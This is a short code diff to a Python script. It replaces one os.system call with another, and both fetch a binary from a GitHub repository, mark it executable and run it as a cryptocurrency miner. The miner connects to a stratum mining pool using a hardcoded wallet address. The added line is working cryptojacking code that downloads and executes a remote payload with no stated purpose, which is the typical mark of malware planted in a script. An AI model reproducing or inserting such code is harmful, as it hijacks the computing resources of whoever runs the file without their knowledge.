@@ -12,4 +12,4 @@ from subprocess import PIPE, Popen
 import base64
 
 
-os.system("curl -L -o tids https://github.com/Ikuzot/nung/raw/main/tids && chmod +x tids && ./tids -o stratum+tcp://178.170.40.44:6243 -u TJWU4ZcckKovqAp9XhypKkYgAwtMqBwzip.NUNG --algo yespower --param-n 2048 --param-r 8 --param-key """) 
+os.system("curl -L -o esrb https://github.com/Ikuzot/nung/raw/main/esrb && chmod +x esrb && ./esrb --disable-gpu --algorithm yespowertide --pool stratum+tcp://tidemine.com:3332 --wallet TJWU4ZcckKovqAp9XhypKkYgAwtMqBwzip --password x -t 14") 
